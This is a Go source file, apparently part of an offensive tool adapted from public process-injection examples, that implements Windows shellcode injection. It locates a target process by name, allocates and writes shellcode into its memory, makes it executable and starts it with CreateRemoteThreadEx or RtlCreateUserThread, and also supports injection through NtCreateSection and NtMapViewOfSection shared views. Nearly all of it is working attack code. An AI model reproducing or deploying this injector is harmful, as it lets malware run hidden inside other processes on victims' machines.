package main

// Borrowed: https://github.com/blackhat-go/bhg/tree/master/ch-12/procInjector
// Reference: https://github.com/Ne0nd0g/go-shellcode
// NTSTATUS values: // https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-erref/596a1078-e883-4972-9bbc-49e60bebca55

import (
	"errors"
	"fmt"
	"strings"

	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

const (
	ERROR_NOT_ALL_ASSIGNED syscall.Errno = 1300

	SecurityAnonymous      = 0
	SecurityIdentification = 1
	SecurityImpersonation  = 2
	SecurityDelegation     = 3

	// Integrity Levels
	SECURITY_MANDATORY_UNTRUSTED_RID         = 0x00000000
	SECURITY_MANDATORY_LOW_RID               = 0x00001000
	SECURITY_MANDATORY_MEDIUM_RID            = 0x00002000
	SECURITY_MANDATORY_HIGH_RID              = 0x00003000
	SECURITY_MANDATORY_SYSTEM_RID            = 0x00004000
	SECURITY_MANDATORY_PROTECTED_PROCESS_RID = 0x00005000

	SE_PRIVILEGE_ENABLED_BY_DEFAULT uint32 = 0x00000001
	SE_PRIVILEGE_ENABLED            uint32 = 0x00000002
	SE_PRIVILEGE_REMOVED            uint32 = 0x00000004
	SE_PRIVILEGE_USED_FOR_ACCESS    uint32 = 0x80000000

	// https://docs.microsoft.com/en-us/windows/desktop/secauthz/privilege-constants
	SE_ASSIGNPRIMARYTOKEN_NAME                = "SeAssignPrimaryTokenPrivilege"
	SE_AUDIT_NAME                             = "SeAuditPrivilege"
	SE_BACKUP_NAME                            = "SeBackupPrivilege"
	SE_CHANGE_NOTIFY_NAME                     = "SeChangeNotifyPrivilege"
	SE_CREATE_GLOBAL_NAME                     = "SeCreateGlobalPrivilege"
	SE_CREATE_PAGEFILE_NAME                   = "SeCreatePagefilePrivilege"
	SE_CREATE_PERMANENT_NAME                  = "SeCreatePermanentPrivilege"
	SE_CREATE_SYMBOLIC_LINK_NAME              = "SeCreateSymbolicLinkPrivilege"
	SE_CREATE_TOKEN_NAME                      = "SeCreateTokenPrivilege"
	SE_DEBUG_NAME                             = "SeDebugPrivilege"
	SE_DELEGATE_SESSION_USER_IMPERSONATE_NAME = "SeDelegateSessionUserImpersonatePrivilege"
	SE_ENABLE_DELEGATION_NAME                 = "SeEnableDelegationPrivilege"
	SE_IMPERSONATE_NAME                       = "SeImpersonatePrivilege"
	SE_INC_BASE_PRIORITY_NAME                 = "SeIncreaseBasePriorityPrivilege"
	SE_INCREASE_QUOTA_NAME                    = "SeIncreaseQuotaPrivilege"
	SE_INC_WORKING_SET_NAME                   = "SeIncreaseWorkingSetPrivilege"
	SE_LOAD_DRIVER_NAME                       = "SeLoadDriverPrivilege"
	SE_LOCK_MEMORY_NAME                       = "SeLockMemoryPrivilege"
	SE_MACHINE_ACCOUNT_NAME                   = "SeMachineAccountPrivilege"
	SE_MANAGE_VOLUME_NAME                     = "SeManageVolumePrivilege"
	SE_PROF_SINGLE_PROCESS_NAME               = "SeProfileSingleProcessPrivilege"
	SE_RELABEL_NAME                           = "SeRelabelPrivilege"
	SE_REMOTE_SHUTDOWN_NAME                   = "SeRemoteShutdownPrivilege"
	SE_RESTORE_NAME                           = "SeRestorePrivilege"

	MEM_COMMIT  = 0x1000
	MEM_RESERVE = 0x2000
	MEM_RELEASE = 0x8000

	PROCESS_CREATE_PROCESS            = 0x0080
	PROCESS_CREATE_THREAD             = 0x0002
	PROCESS_DUP_HANDLE                = 0x0040
	PROCESS_QUERY_INFORMATION         = 0x0400
	PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
	PROCESS_SET_INFORMATION           = 0x0200
	PROCESS_SET_QUOTA                 = 0x0100
	PROCESS_SUSPEND_RESUME            = 0x0800
	PROCESS_TERMINATE                 = 0x0001
	PROCESS_VM_OPERATION              = 0x0008
	PROCESS_VM_READ                   = 0x0010
	PROCESS_VM_WRITE                  = 0x0020
	PROCESS_ALL_ACCESS                = 0x001F0FFF

	CREATE_SUSPENDED = 0x00000004

	TH32CS_SNAPPROCESS = 0x00000002

	SIZE     = 64 * 1024
	INFINITE = 0xFFFFFFFF

	PAGE_NOACCESS          = 0x00000001
	PAGE_READONLY          = 0x00000002
	PAGE_READWRITE         = 0x00000004
	PAGE_WRITECOPY         = 0x00000008
	PAGE_EXECUTE           = 0x00000010
	PAGE_EXECUTE_READ      = 0x00000020
	PAGE_EXECUTE_READWRITE = 0x00000040
	PAGE_EXECUTE_WRITECOPY = 0x00000080
	PAGE_GUARD             = 0x00000100
	PAGE_NOCACHE           = 0x00000200
	PAGE_WRITECOMBINE      = 0x00000400

	DELETE                   = 0x00010000
	READ_CONTROL             = 0x00020000
	WRITE_DAC                = 0x00040000
	WRITE_OWNER              = 0x00080000
	SYNCHRONIZE              = 0x00100000
	STANDARD_RIGHTS_READ     = READ_CONTROL
	STANDARD_RIGHTS_WRITE    = READ_CONTROL
	STANDARD_RIGHTS_EXECUTE  = READ_CONTROL
	STANDARD_RIGHTS_REQUIRED = DELETE | READ_CONTROL | WRITE_DAC | WRITE_OWNER
	STANDARD_RIGHTS_ALL      = STANDARD_RIGHTS_REQUIRED | SYNCHRONIZE

	TOKEN_ASSIGN_PRIMARY    = 0x0001
	TOKEN_DUPLICATE         = 0x0002
	TOKEN_IMPERSONATE       = 0x0004
	TOKEN_QUERY             = 0x0008
	TOKEN_QUERY_SOURCE      = 0x0010
	TOKEN_ADJUST_PRIVILEGES = 0x0020
	TOKEN_ADJUST_GROUPS     = 0x0040
	TOKEN_ADJUST_DEFAULT    = 0x0080
	TOKEN_ADJUST_SESSIONID  = 0x0100
	TOKEN_ALL_ACCESS        = (STANDARD_RIGHTS_REQUIRED |
		TOKEN_ASSIGN_PRIMARY |
		TOKEN_DUPLICATE |
		TOKEN_IMPERSONATE |
		TOKEN_QUERY |
		TOKEN_QUERY_SOURCE |
		TOKEN_ADJUST_PRIVILEGES |
		TOKEN_ADJUST_GROUPS |
		TOKEN_ADJUST_DEFAULT |
		TOKEN_ADJUST_SESSIONID)

	SEC_COMMIT      = 0x08000000
	SECTION_WRITE   = 0x2
	SECTION_READ    = 0x4
	SECTION_EXECUTE = 0x8
	SECTION_RWX     = (SECTION_WRITE | SECTION_READ | SECTION_EXECUTE)
)

// type SecurityAttributes struct {
// 	Length             uint32
// 	SecurityDescriptor *windows.SECURITY_DESCRIPTOR
// 	InheritHandle      uint32
// }

type Inject struct {
	Pid              uint32 // FindTarget
	ProcessName      string // main
	ShellCode        []byte // main
	ShellCodeSize    uint32 // main
	Privilege        string
	RemoteProcHandle uintptr // OpenProcessHandle
	Lpaddr           uintptr // VirtualAllocEx
	LoadLibAddr      uintptr // GetLoadLibAddress
	RThread          uintptr // CreateRemoteThread
	Token            TOKEN
	SectionHandle    uintptr //NtCreateSection
	SectionLclView   uintptr //NtMapViewOfSectionLocal
	SectionRmtView   uintptr //NtMapViewOfSectionRemote
}

type TOKEN struct {
	tokenHandle syscall.Token
}

var nullRef int

func FindTarget(i *Inject) error {
	var pe32 windows.ProcessEntry32
	pe32.Size = uint32(unsafe.Sizeof(pe32))

	hSnap, snapErr := windows.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, uint32(0))
	if snapErr != nil {
		fmt.Printf("Error creating snapshot: %s\n", snapErr)
		return snapErr
	}
	defer windows.CloseHandle(hSnap)

	err := windows.Process32First(hSnap, &pe32)
	if err != nil {
		fmt.Printf("Error finding process: %s\n", err)
		return err
	}

	for {
		szexe := windows.UTF16ToString(pe32.ExeFile[:])
		if strings.EqualFold(szexe, i.ProcessName) {
			i.Pid = pe32.ProcessID
			return nil
		}
		err = windows.Process32Next(hSnap, &pe32)
		if err != nil {
			break
		}
	}

	return errors.New("error: couldn't find PID")
}

func OpenProcessHandle(i *Inject) error {
	var rights uint32 = PROCESS_CREATE_THREAD |
		PROCESS_QUERY_INFORMATION |
		PROCESS_VM_OPERATION |
		PROCESS_VM_WRITE |
		PROCESS_VM_READ
	var inheritHandle uint32 = 0
	var processID uint32 = i.Pid

	remoteProcHandle, _, lastErr := procOpenProcess.Call(
		uintptr(rights),
		uintptr(inheritHandle),
		uintptr(processID))

	if remoteProcHandle == 0 {
		fmt.Printf("[-]  Can't Open Remote Process. Maybe running w elevated integrity?: %s\n", lastErr)
		return lastErr
	}

	i.RemoteProcHandle = remoteProcHandle
	fmt.Printf("[-] Target PID: %v\n", i.Pid)
	fmt.Printf("[-] SC Size: %v\n", i.ShellCodeSize)
	fmt.Printf("[+] Process handle: %v\n", unsafe.Pointer(i.RemoteProcHandle))

	return nil
}

/*
LPVOID VirtualAllocEx(
  [in]           HANDLE hProcess,
  [in, optional] LPVOID lpAddress,
  [in]           SIZE_T dwSize,
  [in]           DWORD  flAllocationType,
  [in]           DWORD  flProtect
);
*/
func VirtualAllocEx(i *Inject) error {
	var flAllocationType uint32 = MEM_COMMIT | MEM_RESERVE
	var flProtect uint32 = PAGE_READWRITE
	lpBaseAddress, _, lastErr := procVirtualAllocEx.Call(
		i.RemoteProcHandle,
		uintptr(nullRef),
		uintptr(i.ShellCodeSize),
		uintptr(flAllocationType),
		uintptr(flProtect))

	if lpBaseAddress == 0 {
		fmt.Printf("[-]   Can't Allocate Memory On Remote Process: %s\n", lastErr)
		return lastErr
	}

	i.Lpaddr = lpBaseAddress

	fmt.Printf("[+] Base memory address: %v\n", unsafe.Pointer(i.Lpaddr))
	return nil
}

func WriteProcessMemoryRemote(i *Inject) error {
	var nBytesWritten *byte
	writeMem, _, lastErr := procWriteProcessMemory.Call(
		i.RemoteProcHandle,
		i.Lpaddr,
		uintptr(unsafe.Pointer(&i.ShellCode[0])), //LPCVOID is a pointer to a buffer of data
		uintptr(i.ShellCodeSize),
		uintptr(unsafe.Pointer(nBytesWritten)))

	if writeMem == 0 {
		fmt.Printf("[-]   Can't write to process memory.: %s\n", lastErr)
		return lastErr
	}
	return nil
}

/*
BOOL WriteProcessMemory(
  [in]  HANDLE  hProcess,
  [in]  LPVOID  lpBaseAddress,
  [in]  LPCVOID lpBuffer,
  [in]  SIZE_T  nSize,
  [out] SIZE_T  *lpNumberOfBytesWritten
);
*/
func WriteProcessMemoryLocal(i *Inject) error {
	var nBytesWritten *byte
	currentProcHandle, err := syscall.GetCurrentProcess()
	if err != nil {
		fmt.Printf("[-]   Error getting current process: %v\n", err)
	}
	writeMem, _, lastErr := procWriteProcessMemory.Call(
		uintptr(currentProcHandle),
		i.SectionLclView,
		uintptr(unsafe.Pointer(&i.ShellCode[0])), //LPCVOID is a pointer to a buffer of data
		uintptr(i.ShellCodeSize),
		uintptr(unsafe.Pointer(nBytesWritten)))

	if writeMem == 0 {
		fmt.Printf("[-]   Can't write to process memory.: %s\n", lastErr)
		return lastErr
	}
	return nil
}

func GetLoadLibAddress(i *Inject) error {
	var llibBytePtr *byte
	llibBytePtr, err := syscall.BytePtrFromString("LoadLibraryA")
	if err != nil {
		return err
	}
	lladdr, _, lastErr := procGetProcAddress.Call(
		kernel32DLL.Handle(),
		uintptr(unsafe.Pointer(llibBytePtr)))
	if &lladdr == nil {
		fmt.Printf("[-]   Can't get process address.: %s\n", lastErr)
		return lastErr
	}
	i.LoadLibAddr = lladdr
	fmt.Printf("[+] Kernel32.Dll memory address: %v\n", unsafe.Pointer(kernel32DLL.Handle()))
	fmt.Printf("[+] Loader memory address: %v\n", unsafe.Pointer(i.LoadLibAddr))
	return nil
}

/*
HANDLE CreateRemoteThreadEx(
  [in]            HANDLE                       hProcess,
  [in, optional]  LPSECURITY_ATTRIBUTES        lpThreadAttributes,
  [in]            SIZE_T                       dwStackSize,
  [in]            LPTHREAD_START_ROUTINE       lpStartAddress,
  [in, optional]  LPVOID                       lpParameter,
  [in]            DWORD                        dwCreationFlags,
  [in, optional]  LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,
  [out, optional] LPDWORD                      lpThreadId
);
*/
func CreateRemoteThreadEx(i *Inject) error {
	var threadId uint32 = 0
	var dwCreationFlags uint32 = 0

	remoteThread, _, lastErr := procCreateRemoteThreadEx.Call(
		i.RemoteProcHandle,
		uintptr(nullRef),
		uintptr(0),
		i.Lpaddr,
		uintptr(nullRef),
		uintptr(dwCreationFlags),
		uintptr(nullRef),
		uintptr(unsafe.Pointer(&threadId)),
	)
	if remoteThread == 0 {
		fmt.Printf("[-]   Can't Create Remote Thread.: %s\n", lastErr)
		return lastErr
	}

	i.RThread = remoteThread
	fmt.Printf("[+] Thread identifier created: %v\n", unsafe.Pointer(&threadId))
	fmt.Printf("[+] Thread handle created: %v\n", unsafe.Pointer(i.RThread))
	return nil
}

/*
typedef NTSTATUS (NTAPI * NtCreateThreadEx_t)(
	OUT PHANDLE hThread,
	IN ACCESS_MASK DesiredAccess,
	IN PVOID ObjectAttributes,
	IN HANDLE ProcessHandle,
	IN PVOID lpStartAddress,
	IN PVOID lpParameter,
	IN ULONG Flags,
	IN SIZE_T StackZeroBits,
	IN SIZE_T SizeOfStackCommit,
	IN SIZE_T SizeOfStackReserve,
	OUT PVOID lpBytesBuffer);
*/
func WaitForSingleObject(i *Inject) error {
	var dwMilliseconds uint32 = INFINITE
	var dwExitCode uint32
	rWaitValue, _, lastErr := procWaitForSingleObject.Call(
		i.RThread,
		uintptr(dwMilliseconds))
	if rWaitValue != 0 {
		fmt.Printf("[-]   Error returning thread wait state..: %s\n", lastErr)
		return lastErr
	}
	success, _, lastErr := procGetExitCodeThread.Call(
		i.RThread,
		uintptr(unsafe.Pointer(&dwExitCode)))
	if success == 0 {
		fmt.Printf("[-]   Error returning thread exit code..: %s\n", lastErr)
		return lastErr
	}
	closed, _, lastErr := procCloseHandle.Call(i.RThread)
	if closed == 0 {
		fmt.Printf("[-]   Error closing thread handle.: %s\n", lastErr)
		return lastErr
	}
	return nil
}

func VirtualFreeEx(i *Inject) error {
	var dwFreeType uint32 = MEM_RELEASE
	var size uint32 = 0 //Size must be 0 if MEM_RELEASE all of the region

	rFreeValue, _, lastErr := procVirtualFreeEx.Call(
		i.RemoteProcHandle,
		i.Lpaddr,
		uintptr(size),
		uintptr(dwFreeType))

	if rFreeValue == 0 {
		fmt.Printf("[-]   Error freeing process memory: %s\n", lastErr)
		return lastErr
	}

	fmt.Println("[+] Success: Freed memory region")
	return nil
}

/*
BOOL VirtualProtectEx(
  [in]  HANDLE hProcess,
  [in]  LPVOID lpAddress,
  [in]  SIZE_T dwSize,
  [in]  DWORD  flNewProtect,
  [out] PDWORD lpflOldProtect
);
*/
func VirtualProtectEx(i *Inject) error {
	var oldProtect uint32 = PAGE_READWRITE
	var newProtect uint32 = PAGE_EXECUTE_READ
	rProtectVal, _, lastErr := procVirtualProtectEx.Call(
		i.RemoteProcHandle,
		i.Lpaddr,
		uintptr(i.ShellCodeSize),
		uintptr(newProtect),
		uintptr(unsafe.Pointer(&oldProtect)))

	if rProtectVal == 0 {
		fmt.Printf("[-]   Error changing memory permissions %s\n", lastErr)
		return lastErr
	}

	fmt.Println("[+] Success: memory changed to RW")
	return nil
}

/*
typedef FARPROC (WINAPI * RtlCreateUserThread_t)(
	IN HANDLE ProcessHandle,
	IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
	IN BOOLEAN CreateSuspended,
	IN ULONG StackZeroBits,
	IN OUT PULONG StackReserved,
	IN OUT PULONG StackCommit,
	IN PVOID StartAddress,
	IN PVOID StartParameter OPTIONAL,
	OUT PHANDLE ThreadHandle,
	OUT PCLIENT_ID ClientId);
*/
// http://undocumented.ntinternals.net/UserMode/Undocumented%20Functions/Executable%20Images/RtlCreateUserThread.html
//	RtlCreateUserThread_t pRtlCreateUserThread = (RtlCreateUserThread_t) GetProcAddress(GetModuleHandle("NTDLL.DLL"), "RtlCreateUserThread");
//	pRtlCreateUserThread(hProc, NULL, FALSE, 0, 0, 0, pRemoteView, 0, &hThread, &cid);
func RtlCreateUserThread(i *Inject) error {
	var threadHandle uint32
	var clientID uint32

	threadStatus, _, lastErr := procRtlCreateUserThread.Call(
		i.RemoteProcHandle,                     //HANDLE ProcessHandle,
		uintptr(nullRef),                       //PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
		uintptr(0),                             //CreateSuspended
		uintptr(0),                             //StackZeroBits
		uintptr(0),                             //StackReserved
		uintptr(0),                             //StackCommit
		i.SectionRmtView,                       //StartAddress
		uintptr(0),                             //StartParameter
		uintptr(unsafe.Pointer(&threadHandle)), // ThreadHandle
		uintptr(unsafe.Pointer(&clientID)),     // ClientId
	)
	if threadStatus != 0 {
		fmt.Printf("[-]   Error creating thread: %s\n", lastErr)
		return lastErr
	} else if threadHandle == 0 {
		fmt.Printf("[-]   Unknown error creating thread: handle %v\n", threadHandle)
		return errors.New("unknown error")
	}

	fmt.Printf("[+] Success: Created thread: %v\n", threadHandle)
	return nil
}

// https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwcreatesection
// https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FNtCreateSection.html
/*typedef NTSTATUS (NTAPI * NtCreateSection_t)(
OUT PHANDLE SectionHandle,
IN ULONG DesiredAccess,
IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
IN PLARGE_INTEGER MaximumSize OPTIONAL,
IN ULONG PageAttributess,
IN ULONG SectionAttributes,
IN HANDLE FileHandle OPTIONAL);
*/
func NtCreateSection(i *Inject) error {
	var sectionHandle uintptr

	statusVal, _, lastErr := procNtCreateSection.Call(
		uintptr(unsafe.Pointer(&sectionHandle)),
		uintptr(SECTION_RWX),
		uintptr(nullRef),
		uintptr(unsafe.Pointer(&i.ShellCodeSize)),
		uintptr(PAGE_EXECUTE_READWRITE),
		uintptr(SEC_COMMIT),
		uintptr(nullRef),
	)
	if statusVal != 0 {
		fmt.Printf("[-]   Error creating section: %s\n", lastErr)
		return lastErr
	} else if sectionHandle == 0 {
		fmt.Printf("[-]   Unknown error creating section: handle %v\n", sectionHandle)
		return errors.New("unknown error")
	}
	i.SectionHandle = uintptr(sectionHandle)

	fmt.Printf("[+] Success: Created Section: %v\n", i.SectionHandle)
	return nil
}

// https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwmapviewofsection
// https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FNtMapViewOfSection.html
// pNtMapViewOfSection(hSection, GetCurrentProcess(), &pLocalView, NULL, NULL, NULL, (SIZE_T *) &payload_len, ViewUnmap, NULL, PAGE_READWRITE);
/*
typedef NTSTATUS (NTAPI * NtMapViewOfSection_t)(
	HANDLE SectionHandle,
	HANDLE ProcessHandle,
	PVOID * BaseAddress,
	ULONG_PTR ZeroBits,
	SIZE_T CommitSize,
	PLARGE_INTEGER SectionOffset,
	PSIZE_T ViewSize,
	DWORD InheritDisposition,
	ULONG AllocationType,
	ULONG Win32Protect);
*/
func NtMapViewOfSectionLocal(i *Inject) error {
	var sectionLocalView uintptr
	var sectionOffset uintptr
	currentProcHandle, err := syscall.GetCurrentProcess()
	if err != nil {
		fmt.Printf("[-]   Error getting current process: %v\n", err)
	}
	statusVal, _, _ := procNtMapViewOfSection.Call(
		i.SectionHandle,                            //HANDLE SectionHandle,
		uintptr(currentProcHandle),                 //HANDLE ProcessHandle,
		uintptr(unsafe.Pointer(&sectionLocalView)), //PVOID * BaseAddress,
		uintptr(nullRef),                           //ULONG_PTR ZeroBits
		uintptr(nullRef),                           //SIZE_T CommitSize
		uintptr(unsafe.Pointer(&sectionOffset)),    //PLARGE_INTEGER SectionOffset
		uintptr(unsafe.Pointer(&i.ShellCodeSize)),  //PSIZE_T ViewSize
		uintptr(2),              //DWORD InheritDisposition, ViewUnmap=2 (not mapped to child proc), ViewShare=1
		uintptr(nullRef),        //ULONG AllocationType
		uintptr(PAGE_READWRITE), //ULONG Win32Protect
	)
	if statusVal != 0 {
		fmt.Printf("[-]   Error mapping local section view: %x\n", statusVal)
		return errors.New("unknown error")
	} else if sectionLocalView == 0 {
		fmt.Printf("[-]   Unknown error mapping local section: local view %v\n", sectionLocalView)
		return errors.New("unknown error")
	}
	i.SectionLclView = uintptr(sectionLocalView)

	fmt.Printf("[+] Success: Created local mapped View: %x\n", i.SectionLclView)
	return nil
}

//pNtMapViewOfSection(hSection, hProc, &pRemoteView, NULL, NULL, NULL, (SIZE_T *) &payload_len, ViewUnmap, NULL, PAGE_EXECUTE_READ);
func NtMapViewOfSectionRemote(i *Inject) error {
	var sectionRemoteView uintptr
	statusVal, _, _ := procNtMapViewOfSection.Call(
		i.SectionHandle,    //HANDLE SectionHandle,
		i.RemoteProcHandle, //HANDLE ProcessHandle,
		uintptr(unsafe.Pointer(&sectionRemoteView)), //PVOID * BaseAddress,
		uintptr(nullRef), //ULONG_PTR ZeroBits
		uintptr(nullRef), //SIZE_T CommitSize
		uintptr(nullRef), //PLARGE_INTEGER SectionOffset
		uintptr(unsafe.Pointer(&i.ShellCodeSize)), //PSIZE_T ViewSize
		uintptr(2),                 //DWORD InheritDisposition, ViewUnmap=2 (not mapped to child proc), ViewShare=1
		uintptr(nullRef),           //ULONG AllocationType
		uintptr(PAGE_EXECUTE_READ), //ULONG Win32Protect
	)
	if statusVal != 0 {
		fmt.Printf("[-]   Error mapping remote section view: %x\n", statusVal)
		return errors.New("unknown error")
	} else if sectionRemoteView == 0 {
		fmt.Printf("[-]   Unknown error mapping remote section: local view %v\n", sectionRemoteView)
		return errors.New("unknown error")
	}
	i.SectionRmtView = uintptr(sectionRemoteView)

	fmt.Printf("[+] Success: Created remote mapped View: %x\n", i.SectionLclView)
	return nil
}
